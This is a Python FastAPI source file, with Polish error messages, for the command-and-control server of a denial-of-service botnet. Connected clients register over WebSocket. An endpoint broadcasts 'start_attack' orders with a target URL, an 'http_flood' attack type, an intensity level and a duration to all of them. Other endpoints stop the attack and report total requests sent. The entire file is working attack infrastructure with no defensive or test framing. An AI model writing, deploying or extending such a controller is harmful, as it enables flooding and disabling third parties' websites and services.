from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from fastapi.middleware.cors import CORSMiddleware
import json
import asyncio
import time

app = FastAPI()
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])

clients = {}
client_stats = {}
attack_started = 0.0
attack_running = False
stop_task = None

@app.websocket("/ws/{client_id}")
async def websocket_endpoint(websocket: WebSocket, client_id: str):
    await websocket.accept()
    clients[client_id] = websocket
    client_stats[client_id] = 0
    try:
        while True:
            data = await websocket.receive_text()
            if data == "ping":
                await websocket.send_text("pong")
            else:
                try:
                    msg = json.loads(data)
                    if msg.get("action") == "stats":
                        client_stats[client_id] = int(msg.get("count", 0))
                except:
                    pass
    except WebSocketDisconnect:
        clients.pop(client_id, None)
        client_stats.pop(client_id, None)

@app.get("/status")
async def get_status():
    total = sum(client_stats.values())
    elapsed = time.time() - attack_started if attack_started > 0 else 0
    return {
        "online_count": len(clients),
        "clients": list(clients.keys()),
        "total_requests": total,
        "elapsed": round(elapsed, 1),
        "running": attack_running,
        "per_client": dict(client_stats),
    }

async def auto_stop(duration: int):
    await asyncio.sleep(duration)
    await stop_all()

@app.post("/command_all")
async def send_command_all(url: str, attack_type: str = "http_flood", intensity: int = 2, duration: int = 0):
    global attack_started, stop_task, client_stats, attack_running
    if not clients:
        return {"status": "error", "message": "Brak klientów"}

    if not url or (not url.startswith("http://") and not url.startswith("https://") and not url.replace(".", "").isdigit()):
        return {"status": "error", "message": "Nieprawidłowy format URL"}

    intensity = max(1, min(16, intensity))

    for k in client_stats:
        client_stats[k] = 0
    attack_started = time.time()
    attack_running = True

    if stop_task and not stop_task.done():
        stop_task.cancel()

    payload = json.dumps({
        "action": "start_attack",
        "url": url,
        "attack_type": attack_type,
        "intensity": intensity,
    })
    await asyncio.gather(*[ws.send_text(payload) for ws in clients.values()])

    if duration > 0:
        stop_task = asyncio.create_task(auto_stop(duration))

    return {
        "status": "broadcasted",
        "clients_count": len(clients),
        "attack_type": attack_type,
        "intensity": intensity,
        "duration": duration,
    }

@app.post("/stop_all")
async def stop_all():
    global attack_running, attack_started, stop_task
    if not clients:
        return {"status": "error"}
    attack_running = False
    attack_started = 0.0
    if stop_task and not stop_task.done():
        stop_task.cancel()
    payload = json.dumps({"action": "stop"})
    await asyncio.gather(*[ws.send_text(payload) for ws in clients.values()])
    return {"status": "stopped", "clients_count": len(clients)}
